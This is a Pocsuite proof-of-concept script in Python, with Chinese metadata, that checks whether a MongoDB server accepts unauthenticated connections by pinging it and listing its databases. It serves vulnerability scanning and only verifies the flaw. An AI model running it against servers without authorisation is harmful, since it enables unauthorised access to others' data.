#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.utils import randomStr
from pocsuite.api.webshell import Webshell
from urlparse import urlparse
import socket
import pymongo


class TestPOC(POCBase):
    vulID = '96268'
    version = '1'
    author = 'co0ontty'
    vulDate = ''
    createDate = ''
    updateDate = ''
    references = ['https://www.freebuf.com/vuls/212799.html']
    name = 'mongodb 未授权访问漏洞'
    appPowerlink = 'https://www.mongodb.com/'
    appName = 'mongodb'
    appVersion = 'ALL'
    vulType = '信息泄漏'
    desc = '''由于使用 mongodb 的时候没有使用身份校验，导致所有人均可访问数据库'''
    samples = []
    install_requires = ['socket','pymongo']
    
    def _verify(self, verify=True):
        def connect(mongo_url):
            count = 0
            while True:
                client = pymongo.MongoClient(mongo_url, serverSelectionTimeoutMS=3)
                try:
                    client.admin.command("ping")
                except:
                    count += 1
                else:
                    break
                if count == 3:
                    return False
            return client
        result = {}
        host = urlparse(self.url).hostname
        port = urlparse(self.url).port
        mongo_url = "mongodb://{host}:{port}/".format(host=host, port=port)
        counect = connect(mongo_url)
        try:
            dblist = counect.list_database_names()
            if dblist:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except :
            pass
        
        
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("Internet nothing returned")
        return output


register(TestPOC)
